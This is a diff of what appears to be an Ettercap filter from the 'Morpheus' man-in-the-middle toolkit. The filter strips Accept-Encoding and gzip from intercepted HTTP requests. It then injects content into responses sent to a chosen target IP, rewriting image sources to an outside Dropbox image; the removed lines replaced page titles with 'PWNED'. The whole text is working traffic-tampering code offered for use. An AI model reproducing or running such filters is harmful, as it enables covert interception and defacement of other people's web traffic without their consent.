@@ -16,6 +16,8 @@
 ##
 
 
+
+
 ##########################
 ## Zap Content Encoding ##
 ##########################
@@ -23,11 +25,12 @@ if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {  
     replace("Accept-Encoding", "Accept-Rubbish!");   
       # note: replacement string is same length as original string  
-      msg("[Morpheus] Encoding zapped.");  
+      msg("[Morpheus] Status: Encoding zapped.");  
    }  
    if (search(DATA.data, "gzip")) {  
     replace("gzip", "  ");  
-    msg("[Morpheus] whited out gzip!");  
+    msg("[Morpheus] |  info : whited out gzip!");
+    msg("[Morpheus] |_ info : Image injected and forward to target ✔\n"); 
    }  
 }
 
@@ -35,12 +38,12 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 ## Replace Content ##
 #####################
- if (ip.proto == TCP && tcp.src == 80) {  
-   replace("<title>", "<title>PWNED<\/tITle><bodY><p><img src="http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg"></p></boDY>");  
-   replace("<TITLE>", "<title>PWNED<\/tITle><bodY><p><img src="http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg"></p></boDY>");  
-   replace("</title>", " ");  
-   replace("</TITLE>", " ");  
-   replace("<body>", " ");  
-   replace("<BODY>", " ");  
-   msg("[Morpheus] Image injected and forward to target...\n");
+# http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg
+# https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png
+# https://dl.dropboxusercontent.com/u/21426454/pwned_DH.jpg
+
+ if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png\" ");  
+   replace("IMG SRC=", "img src=\"https://dl.dropboxusercontent.com/u/21426454/DLL%20Injection-Functions.png\" ");   
  } 
+
